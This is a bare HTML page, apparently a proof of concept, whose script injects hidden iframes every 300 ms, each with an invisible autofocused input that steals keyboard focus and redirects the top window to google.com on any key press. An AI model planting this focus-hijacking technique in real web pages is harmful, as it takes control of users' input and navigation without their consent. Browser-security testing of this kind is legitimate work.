<html>
    <head></head>
    <body>
        <script>
            window["looper"] = setInterval(function() {

                let I = document.createElement("iframe");
                I.classList.add('badFrame');
                (document['body'] || document['head']['parentNode'] || document['head'])['appendChild'](I);

                I['srcdoc'] = '<script>onkeydown=function(){top.location="http://google.com";}<\/script><input autofocus type="text" style="width:0px;height:0px;border:0px;">';

                 //queue the cleanup function
                setTimeout(function(){
                    var inputs = document.getElementsByClassName("badFrame");
                    if (inputs.length > 1){
                        for ( i =0; i < inputs.length; ++i){
                            inputs[i].remove();
                        }
                    }
                },10);

            }, 300);
        </script>
    </body>
</html>
